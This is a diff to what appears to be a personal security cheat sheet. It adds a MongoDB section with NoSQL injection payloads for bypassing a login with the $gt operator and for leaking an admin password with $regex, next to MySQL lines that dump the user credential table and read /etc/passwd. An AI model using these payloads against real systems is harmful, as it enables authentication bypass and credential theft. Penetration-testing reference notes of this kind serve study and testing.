@@ -415,6 +415,18 @@ select user,host,password from mysql.user;
 select load_file("/etc/passwd");
 ```
 
+# mongodb
+
+- example of testing for injections
+```
+{"username":{"$gt":""}."password":{"$gt":""}}
+```
+
+- password leaking
+```
+{"user":"admin","pass":{"$regex":"^password"}}
+```
+
 # bash/zsh keystrokes
 
 bash and zsh are different, but these keystrokes work for both. They
